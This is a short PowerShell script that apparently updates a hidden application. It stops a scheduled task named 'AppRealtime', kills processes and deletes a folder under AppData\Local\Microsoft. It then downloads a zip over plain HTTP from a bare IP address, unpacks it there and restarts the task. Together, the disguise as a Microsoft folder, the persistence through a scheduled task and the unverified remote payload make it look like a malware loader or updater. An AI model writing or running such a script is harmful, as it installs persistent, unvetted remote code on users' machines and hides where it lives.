# Variables for task name and paths
$taskName = 'AppRealtime'
$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
$appDataPath = "C:\Users\$currentUserName\AppData"
$currentDir = "$appDataPath\Local\Microsoft\AppRealTime"
$zipUrl = "http://116.203.93.143/00_update/app.zip"
$zipFile = "$currentDir\app.zip"

# 1. Stop the scheduled task if it is running
$task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if ($task -ne $null) {
    if ($task.State -eq 'Running') {
        Stop-ScheduledTask -TaskName $taskName
    }
}

# 2. Check for any processes using the files and kill them, then delete the directory
if (Test-Path -Path $currentDir) {
    $lockingProcesses = Get-Process | Where-Object { $_.Modules.FileName -like "$currentDir\*" }
    foreach ($process in $lockingProcesses) {
        Stop-Process -Id $process.Id -Force
    }
    Remove-Item -Path $currentDir -Recurse -Force
}
New-Item -ItemType Directory -Path $currentDir | Out-Null

# 3. Download the zip file from the server and extract it
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
Expand-Archive -Path $zipFile -DestinationPath $currentDir

# 4. Start the task schedule again
Start-ScheduledTask -TaskName $taskName